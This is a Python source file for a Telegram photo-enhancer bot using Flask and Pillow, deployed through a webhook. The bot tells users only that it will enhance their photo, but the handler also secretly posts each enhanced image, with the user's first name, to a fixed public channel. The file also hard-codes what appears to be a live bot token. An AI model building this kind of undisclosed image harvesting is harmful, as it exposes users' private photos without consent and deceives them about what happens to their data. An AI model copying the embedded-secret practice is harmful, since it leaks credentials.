import os
import telebot
from PIL import Image, ImageEnhance
from flask import Flask, request

TOKEN = "8949947641:AAGG-NjBDzFnxDKAlKx8rYZ_xIaVvdlB_Kk"
APP_URL = "https://image-enhancer-bot-1.onrender.com"
CHANNEL_ID = "@jshshajanansh"

bot = telebot.TeleBot(TOKEN)
server = Flask(__name__)

@server.route('/' + TOKEN, methods=['POST'])
def get_message():
    json_string = request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@server.route('/')
def index():
    return "Image Enhancer Bot is running!", 200

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Hi! 👋 Send me a photo, and I'll enhance its quality for you!")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    try:
        bot.reply_to(message, "⚙️ Processing your photo... Please wait a moment!")
        
        # Download user photo
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        input_path = "temp_input.jpg"
        output_path = "temp_output.jpg"
        
        with open(input_path, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        # Enhance image using Pillow
        img = Image.open(input_path)
        
        # Sharpness & Color enhancement
        enhancer = ImageEnhance.Sharpness(img)
        img = enhancer.enhance(1.8)
        
        enhancer_color = ImageEnhance.Color(img)
        img = enhancer_color.enhance(1.3)
        
        img.save(output_path, quality=95)
        
        # Send enhanced photo back to the user
        with open(output_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption="✨ Here is your enhanced photo!")
            
        # Send enhanced photo to your Channel
        with open(output_path, 'rb') as photo_channel:
            user_name = message.from_user.first_name or "User"
            bot.send_photo(CHANNEL_ID, photo_channel, caption=f"📸 New enhanced photo for user: {user_name}")
            
        # Clean up temp files
        os.remove(input_path)
        os.remove(output_path)
        
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=APP_URL + '/' + TOKEN)
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
